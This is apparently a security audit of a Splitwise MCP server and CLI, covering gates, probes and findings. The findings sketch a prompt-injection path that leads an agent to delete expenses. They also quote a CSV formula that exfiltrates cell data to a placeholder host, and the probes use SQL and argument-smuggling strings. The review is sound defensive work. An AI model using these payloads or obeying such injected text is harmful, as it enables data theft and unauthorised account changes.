Method: read the real gates (`cmd/splitwise-pp-mcp/main.go`, `internal/mcp/{tools,intents,platform_gate}.go`, `internal/mcp/cobratree/{shellout,typemap,cli_path}.go`, `internal/client/client.go`, `internal/cliutil/verifyenv.go`, `internal/cli/{helpers,root,platform_client}.go`), then probed binaries built from this tree into the scratchpad against an isolated `HOME` and an empty scratch store — no operator store, no API key, no live call. `go vet` + `go test ./cmd/... ./internal/mcp/...` green; `govulncheck ./...` "No vulnerabilities found"; `go.mod`/`go.sum` byte-identical to the 4.31.6 library tree.

## Verdict
**Safe to ship** — no Critical/High; the 4.31.7 framework delta introduces no new exposure in this artifact, every claimed gate (HTTP bearer/TLS, harness refusal, sql read-only, root-flag blocklist) was confirmed by probe, and the two real findings are a pre-existing generator misannotation (Medium, not a regression) and a CSV-hygiene hardening (Low).

## Threat model (brief)
- Principals: the operator (owns `SPLITWISE_API_KEY` + the local store of personal financial data); an MCP host/agent talking to `splitwise-pp-mcp` over stdio or HTTP; the Printing Press harnesses (verify/dogfood) running the CLI with real creds; other Splitwise users (untrusted authors of expense descriptions, comments, names that get synced into the store and rendered).
- Boundaries: (1) MCP HTTP edge → bearer gate → tool dispatch; (2) MCP tool args → `cliArgsFromMCP` blocklist → child CLI exec (`exec.CommandContext`, no shell); (3) CLI → Splitwise API with the bound key (WRITE tools exist: `settle_up --record`, `split --record`, `create/delete/undelete-expense_create`, …); (4) local SQLite store reached by `sql`/`search` (read-only open) and by hand commands' `--db`.
- Assets: the API key (full account write), friend/balance/expense PII, the operator's real Splitwise account state.

## Findings

**[MEDIUM] `internal/mcp/tools.go:100-135, 259-286` — MCP typed tool annotations (pre-existing, NOT a 4.31.7 regression)** — Every generated typed mutating tool (`delete-expense_create`, `delete-comment_create`, `delete-friend_create`, `delete-group_create`, `remove-user-from-group_create`, `undelete-*`, `create-*`) is registered with `mcplib.WithDestructiveHintAnnotation(false)`; the file contains zero `WithDestructiveHintAnnotation(true)`. Probe (`tools/list`): `delete-expense_create annotations= {readOnlyHint: False, destructiveHint: False, …}`. Per the MCP spec, `destructiveHint=false` asserts "only additive updates"; hosts that use it to decide whether to prompt will run a delete un-prompted. Abuse path: a synced expense description (other-user-controlled, and the agent reads the store) carries a prompt injection → agent calls `delete-expense_create {id}` → host skips confirmation because the tool self-declares non-destructive → real-account deletion with the operator's key. Contrast: the command-mirror tools `settle_up`/`split` correctly carry `destructiveHint: True`. The generator's own comment on the sql gate (`tools.go:891-895`) states a false hint on a mutating tool "is treated as a real bug per the project's agent-native security model" — the typed delete tools violate that rule. Verified identical in the 4.31.6 library tree (`library/splitwise/internal/mcp/tools.go` same lines) and therefore in published 1.0.0, so this is not something the reprint introduced and the hand code cannot fix it (generated, DO NOT EDIT). Remediation: machine issue — emit `WithDestructiveHintAnnotation(true)` for DELETE-semantics operations (and omit the annotation, i.e. leave the spec default `true`, for other writes); until then, note in the release/session report that host gating for typed delete tools must key on `readOnlyHint=false`, not `destructiveHint`. (CWE-1188 insecure default / OWASP LLM06 excessive agency)

**[LOW] `internal/cli/helpers.go:2584-2593` `writeCSVRow` (4.31.7 generated) — CSV formula injection** — Cells are quoted only when they contain `, " \r \n`; a cell beginning with `= + - @` or a tab is emitted verbatim. Third-party-authored strings reach `--csv` (expense `description`, comment `content`, friend/member names from the store; e.g. `ledger --csv`, `spend --csv`, and every generated `get-*` under `--csv`). A friend who names an expense `=HYPERLINK("http://x/?"&A1)` gets a live formula in the operator's spreadsheet. Note the 4.31.7 change is an improvement over 4.31.6 (which joined cells with no quoting at all); the formula case just remains open. Numeric cells are formatted separately (`strconv.FormatFloat`, `writeCSVRows:2573`) so a fix can neutralize only string cells (prefix `'` or a tab when the first rune is `= + - @ \t \r`) without corrupting negative amounts. Generated file → machine retro; hand-side, `emitStructured` (`splitwise_output.go:19-21`) could pre-sanitize before calling `printCSV`, but forking the generated CSV contract is not worth it for this release. (CWE-1236)

**[LOW, accepted residual — unchanged from yesterday's disposition] `internal/mcp/cobratree/shellout.go:209-220` `blockedRootFlags` lacks `db`; per-command `--db` is forwarded on 33/70 mirror tools** — Probe `tools/list`: 33 tools expose a `db` property (activity, audit, balances, brief, debts, fairness, ledger, net, settle_up, split, sync, …); probe `ledger {db:"/nonexistent-dir-xyz/x.db"}` reached `mkdir /nonexistent-dir-xyz` in the child (blocked only by this sandbox's read-only FS). So an authenticated MCP caller can point a read-only-hinted tool at any SQLite path the server account can reach, or create one. Count is exactly what yesterday's P5-B disposition recorded (33, the generator's own convention for `sync`/`teach`/…), i.e. not regressed. Precondition is an already-authenticated caller (bearer token on HTTP, or the stdio parent), which bounds it to the operator's own trust domain. Remediation remains the machine issue already filed (add `db` to `blockedRootFlags` / treat per-command `--db` like `receipt-file` in `blockedDestinationFlags`). (CWE-73)

**[INFO, accepted by decision 2026-09-04] MCP write tools have no in-process gate under MCP** — `settle_up {record:true}` / `split {record:true}` shell out with `--record`; `IsAnyHarness()` (`verifyenv.go:114`) is env-driven and no MCP host sets `PRINTING_PRESS_VERIFY/DOGFOOD`, so under MCP the only gate is host permission on `destructiveHint: True` (confirmed set on both mirror tools). Probe 10/11 with an empty store reached the resolver (exit 3 not-found) — with a synced store and creds the write would proceed. This is the "MCP write opt-in deferred to backlog" decision; recorded, not re-raised. The "MCP-marker refusal" from P5-B still does not exist (no marker in the framework), consistent with yesterday's claim-vs-reality note.

**[INFO] `internal/mcp/cobratree/cli_path.go:15-26` — companion CLI resolution order: sibling-of-executable → `SPLITWISE_CLI_PATH` → `PATH`** — The env var names a binary the MCP server will execute with the operator's credentials. Trust boundary is the server's own process environment (the operator/supervisor), so this is config trust, not a vulnerability; sibling-first means a supervisor that ships both binaries together is never redirected by env. No change requested.

**[INFO] `internal/cli/helpers.go:2613-2641` `printPlain` (new in 4.31.7) and the hand tabwriter tables — no control-character stripping** — Third-party strings (descriptions, names) are written to the terminal unfiltered under `--plain` and in human tables; an ANSI/OSC sequence inside an expense description can restyle or spoof terminal output (CWE-150). Standard CLI posture, low impact, no data or account exposure; hardening candidate for the machine only.

**[INFO] Interface, not security] `fairness nudge` / `split` not-found under `--json` prints only `Error: …` on stderr with empty stdout, while `settle-up` emits `{"code":3,"error":…}`** — matches the brief's candidate Minor; no security consequence (exit code 3 is correct in all three).

## Claimed mitigations — confirmed / refuted

- **"HTTP is never an unauthenticated open door" (`main.go:26-32`) — CONFIRMED.** Default bind `127.0.0.1:7777` (`main.go:35`). Probes: no token → refuses to start (exit 1) for both `--transport http` and `PP_MCP_TRANSPORT=http`; `0.0.0.0:port` and `:port` without TLS → refuse (`requireTLSForNonLoopback:157-165`); `requireBearerAuth` wraps the whole `StreamableHTTPServer` (`main.go:88`) so POST `/mcp`, GET `/mcp` (SSE), and `/` all return 401 without a token; wrong token 401; lowercase `bearer` prefix 401 (strict, fine); `?token=` query bypass 401; correct bearer → 200 initialize. Compare is `subtle.ConstantTimeCompare` (`:187`). `localhost` is pinned to a resolved loopback IP (`classifyHTTPBind:133-149`), closing the rebinding-at-listen gap. Startup log prints the env var NAME, never the value (`:90`).
- **Auth gate on every tool call — CONFIRMED** by construction: the bearer check is an `http.Handler` wrapper ahead of the MCP session layer, not per-tool middleware, so no tool (typed, mirror, intent, `sql`, `search`) is reachable without it. `installFreshTenantGate` (`platform_gate.go:22-46`) is the separate tenant gate; with no registered platform source in this CLI it is a pass-through, which is correct for a single-key CLI.
- **Harness refusal on write paths (P5-A) — CONFIRMED, and ordering is right.** `settle_up.go` (harness check before `openSplitwiseStore`), `fairness_nudge.go` (dry-run → harness → store), `split.go` (dry-run → args/amount → harness → store). Probe with an EMPTY scratch store under `PRINTING_PRESS_DOGFOOD=1` and separately `PRINTING_PRESS_VERIFY=1`: `settle-up "Example Group" --record` (and `--record --force`), `fairness nudge "Example Friend" --send`, `split "Example Group" --amount 84 --equal --record` all returned `{"refused":true,"harness":…}` rc 0 — refusal, not not-found, proving the gate fires before name resolution, so it would fire even if the `pp:happy-args` fixture name DID resolve. The fixtures themselves (`settle-up: <group-or-friend>=Example Group`, `split: <group>=Example Group;--amount=84;--equal`, `nudge: <friend>=Example Friend`, `ledger: <group>=Example Group`) carry no `--record`/`--send`, so the verifier's happy path is plan/preview-only on top of that. Second layer: `client.go:1030` short-circuits mutating verbs under VERIFY (not DOGFOOD) — so under dogfood the command-level refusal is the only write gate, and it is present on all three. `--dry-run --record` → dry-run envelope before anything (`dryRunOK` first).
- **No root `--db` (P5-B) — CONFIRMED** (`root.go:338-357` persistent flags are `config/home/profile/client-profile/receipt…`; no `db`). Per-command `db` remains (see Low above).
- **`sql` tool is read-only (`tools.go:891-921` + `openMCPReadOnlyStore:804`) — CONFIRMED beyond the comment's claims.** Probes: `/* c */ ; ATTACH …` → "only SELECT queries are allowed"; `SELECT 1; VACUUM INTO …` → "only a single SELECT or WITH statement"; well-formed `WITH … INSERT INTO resources …` → `attempt to write a readonly database (8)` (mode=ro really does catch CTE-wrapped writes; count stayed 0); `load_extension(...)` → "not authorized"; `readfile`/`writefile` → "no such function". Bounded by `WithSQLQueryDeadline` (5s) + `SQLScanState` (10k rows / MaxBytes) — the new 4.31.7 DoS bound works as described.
- **Root-flag blocklist (`shellout.go:209`) — CONFIRMED** via MCP: `token`, `home`, `base-url` → "unknown MCP parameters"; `deliver` and `receipt-file` → rejected; `args:"--token evil"` → "flag-like argument not allowed in positional args". `client-profile` IS accepted (probe 18) but is inert in this CLI: `bindPlatformClient` returns nil when `registeredPlatformSource == nil` (`platform_client.go:239-241`) and `enforceMCPBoundProfile` is a no-op with no bound profile — so it cannot switch credentials here. It would matter only for a CLI that registers a platform source, where `BindMCPServerProfile` pins the profile and `:349` refuses a switch.
- **Secret handling across the delta — CONFIRMED clean.** The only `client.go` delta is `UnwrapBinaryResponse` (no logging). Dry-run printer (`client.go:1336-1370`) prints `Authorization: ****` via `maskToken` and masks params via `maskCredentialText`, which now covers `SplitwiseApiKey` plus its query/path-escaped forms (`:1580-1639`); retry/network stderr lines go through `maskError`. `helpers.go` `handleBinaryResponseDelivery` (new) emits a receipt with sink/target/bytes only. New MCP client path `newMCPClientFromConfig` (`tools.go:768-786`) zeroes session credentials on hook failure. Grep of the whole framework diff for `api_key|Authorization|token` shows only pagination-cursor tokens.

## Biggest risks
1. Host-side auto-approval of typed delete tools because they self-declare `destructiveHint=false` (Medium, generated, pre-existing in 1.0.0) — the one place where the artifact's advertised contract is less safe than its behavior.
2. Under MCP there is no in-process write gate; correctness of `settle_up`/`split` writes rests on host permission prompts plus yesterday's dedup/ambiguity fixes (accepted by decision).
3. Any authenticated MCP caller can retarget 33 tools' `--db` (accepted residual; blocked on the machine fix).

## Genuinely solid (incl. where a shallow scan would wrongly flag)
- `exec.CommandContext(ctx, binPath, args...)` with `#nosec G204` (`shellout.go:324`): a scanner flags it, but there is no shell, args are pre-tokenized, `--flag`-shaped positionals are rejected, and the blocklist is applied before the argv is built — not command injection.
- `fmt.Fprintf(os.Stderr, "... (Authorization: Bearer $SPLITWISE_MCP_HTTP_TOKEN)")` (`main.go:90`) looks like a secret log; it is the literal env var name.
- `--message`/`--description` flowing verbatim into JSON bodies for `create_comment`/`create_expense` is the feature, and the bodies are JSON-encoded, not string-built.
- `WITH` allowed by the sql gate looks like a hole; mode=ro closes it (proved above).
- SQL in the store is literal (`resources` table, parameterized), `data_source.go`'s new local filtering is done on decoded rows (`db.List(resourceType, 0)` at `:739`), no query-string building.
- Deps: `mcp-go v0.57.0`, `modernc.org/sqlite v1.37.0`, `cobra v1.9.1` unchanged from the 4.31.6 tree; govulncheck clean.
- Scratch store and default store files are created 0600 (observed in the isolated HOME).
- The `--csv` JSON fallback in `emitStructured` (hand delta) does not widen any surface; it only avoids Go-formatted slices in one-row CSVs.

## Missing controls / over-engineered
- Missing (machine): correct `destructiveHint` on typed DELETE tools; `db` in the MCP blocklist; CSV formula-char neutralization; optional control-char stripping in `printPlain`/human tables.
- Missing (product, deferred by decision): an explicit MCP write opt-in (env or server flag) so `record:true`/`send` cannot execute purely on host prompting.
- Nothing over-engineered in the delta; the bearer + loopback/TLS model is proportionate for a single-operator local MCP.
